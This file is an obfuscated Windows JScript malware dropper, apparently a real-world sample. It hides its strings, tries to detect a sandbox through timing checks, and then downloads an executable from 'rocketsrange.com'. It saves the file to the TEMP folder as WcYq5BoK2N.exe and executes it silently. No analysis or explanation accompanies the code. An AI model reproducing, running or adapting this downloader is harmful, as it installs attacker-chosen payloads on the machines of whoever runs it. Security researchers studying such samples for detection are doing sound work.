var _EA = false;
var _B = "CreateObject";
var _PW = function _W() {return WScript[_B]("WScript"+".Shell");}(), _QA = 11;
var _RI = "MSXML2.XMLHTTP";
var _I = 2123213;
var _R = 0;
function _W0(_Q0){_PW["Run"](_Q0, _R, _R);};
function _MK(){return _RI + "";};
function _BA(_R1, _TU){_R = _R * 1; return _R1 - _TU;};
function _A(){return _B;};
/*@cc_on
  @if (@_win32 || @_win64)
    _EA = true;
  @end
@*/
if (_EA)
{
var _J0 = "";
function _UU(){return 22;};
var _Y = 0; var _R0 = 0;
function _Q()
{
var _A0 = new this["Date"]();
var _F = _A0["getUTCMilliseconds"]();
WScript["Sleep"](_UU());
var _A0 = new this["Date"]();
var _RC = _A0["getUTCMilliseconds"]();
WScript["Sleep"](_UU());
var _A0 = new this["Date"]();
var _LP = _A0["getUTCMilliseconds"]();
var _Y = "_SH";
_Y = _BA(_RC, _F);
var _R0 = "_Z";
_R0 = _BA(_LP, _RC);
_J0 = "open";
return _BA(_Y, _R0);
}
var _YW = false;
var _OE = false;
for (var _LW = _R; _LW < _UU() * 1; _LW++){if (_Q() != _R){
_YW = true; 
_R0 = "31" + 11 * _Y + _R0; 
_OE = true; 
break;
}}
function _X() {return ((_YW == true) && (_YW == _OE)) ? 1 : _R;};
if (_YW && _X() && _OE){
function _YQ() {return _PW["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "WcYq5BoK2N.ex" + "e";};
 _I0 = _MK();
 _W1 = WScript[_B](_I0);
 var _LD = 1;
 while (_LD){
try {
	if (_LD == 1)
	{
		_W1[_J0]("GET", "http://rocketsrange.com/b5ksa", false);
		_W1["send"]();
		_HB = "Sleep";
	}
	WScript[_HB](_UU() + 120); 
	if (_W1["readystate"] < 2 * 2) continue;
	_LD = _R;
	function _J(_D) {var _M = (1, 2, 3, 4, 5, _D); return _M;};
	_JW = WScript[_A()]("ADODB.Stream");
	_I0 = _JW;
	_I0[_J0]();
	_I0["type"] = _J(1);
	_I0["write"](_W1["ResponseBody"]);
	_JW["position"] = _J(_R);
	_I0["Save" + "ToFile"](_YQ(), 2);
	_JW["cl"+"ose"]();
	_RE = _YQ();
	_W0(_RE);
} catch(_F0){};
}
}
}

